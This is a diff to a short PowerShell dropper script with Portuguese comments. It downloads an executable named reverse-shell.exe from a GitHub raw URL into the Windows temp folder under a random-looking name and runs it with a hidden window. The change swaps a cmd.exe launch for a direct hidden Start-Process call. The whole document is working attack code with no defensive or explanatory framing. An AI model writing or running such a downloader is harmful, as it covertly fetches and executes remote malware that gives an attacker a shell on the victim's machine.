@@ -1,4 +1,8 @@
 $url = "https://github.com/0fxdb/instructions/raw/main/srcs/reverse-shell.exe"
 $destino = "$env:TEMP\f71d3aca-21e7-4823-80de-fe10161d7d80.exe"
+
+# Baixar o arquivo usando Invoke-WebRequest
 Invoke-WebRequest -Uri $url -OutFile $destino
-Start-Process cmd.exe -ArgumentList "/c  @echo off && start $destino" -WindowStyle Hidden
+
+# Executar o arquivo baixado diretamente pelo PowerShell
+Start-Process -FilePath $destino -WindowStyle Hidden
